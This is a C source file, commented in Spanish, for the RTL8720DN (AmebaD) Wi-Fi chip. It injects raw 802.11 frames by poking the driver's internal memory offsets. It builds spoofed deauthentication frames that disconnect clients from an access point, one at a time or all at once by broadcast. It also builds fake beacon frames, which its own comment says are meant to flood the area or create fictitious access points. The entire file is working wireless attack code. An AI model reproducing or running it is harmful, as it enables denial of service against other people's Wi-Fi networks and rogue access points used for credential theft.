#include "packet_injection.h"
#include <string.h>

/*
 * Transmite un paquete crudo 802.11 a través del driver Wi-Fi de AmebaD (RTL8720DN).
 * Compatible con frecuencias de 2.4 GHz y 5 GHz según el canal sintonizado actualmente.
 */
void wifi_tx_raw_frame(void* frame, size_t length) {
  if (rltk_wlan_info == NULL) return;

  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  if (ptr == NULL) return;

  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xa80);
  if (frame_control != NULL) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

/*
 * Construye y envía una trama de desautenticación 802.11 estándar
 * @param ap_mac: Dirección MAC del Access Point (BSSID y Source)
 * @param target_mac: MAC del cliente o FF:FF:FF:FF:FF:FF (Broadcast)
 * @param reason: Código de motivo según estándar 802.11 (por defecto 6 = CLASS2_FRAME_FROM_NONAUTH_STA)
 */
void wifi_tx_deauth_frame(const uint8_t* ap_mac, const uint8_t* target_mac, uint16_t reason) {
  DeauthFrame frame;
  frame.frame_control = 0x00C0;
  frame.duration = 0x013A;
  memcpy(frame.destination, target_mac, 6);
  memcpy(frame.source, ap_mac, 6);
  memcpy(frame.bssid, ap_mac, 6);
  frame.sequence_number = 0;
  frame.reason = reason;

  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

/*
 * Envía una baliza (Beacon) falsa para saturar o crear puntos de acceso ficticios
 */
void wifi_tx_beacon_frame(const uint8_t* bssid, const char* ssid, uint8_t channel) {
  BeaconFrame frame;
  memset(&frame, 0, sizeof(BeaconFrame));

  frame.frame_control = 0x0080;
  frame.duration = 0;
  memset(frame.destination, 0xFF, 6); // Broadcast
  memcpy(frame.source, bssid, 6);
  memcpy(frame.bssid, bssid, 6);
  frame.sequence_number = 0;
  frame.timestamp = millis() * 1000ULL;
  frame.beacon_interval = 0x0064; // 100 TU (102.4 ms)
  frame.capabilities = 0x0411;    // ESS, Short Preamble

  // SSID Tag
  frame.ssid_tag = 0;
  uint8_t len = strlen(ssid);
  if (len > 32) len = 32;
  frame.ssid_len = len;
  memcpy(frame.ssid, ssid, len);

  // Supported Rates Tag (1, 2, 5.5, 11 Mbps...)
  uint8_t* p = &frame.ssid[len];
  *p++ = 1; // Rates tag
  *p++ = 8; // Length
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  // DS Parameter Set (Canal actual)
  *p++ = 3; // Channel tag
  *p++ = 1; // Length
  *p++ = channel;

  size_t total_size = (p - (uint8_t*)&frame);
  wifi_tx_raw_frame(&frame, total_size);
}
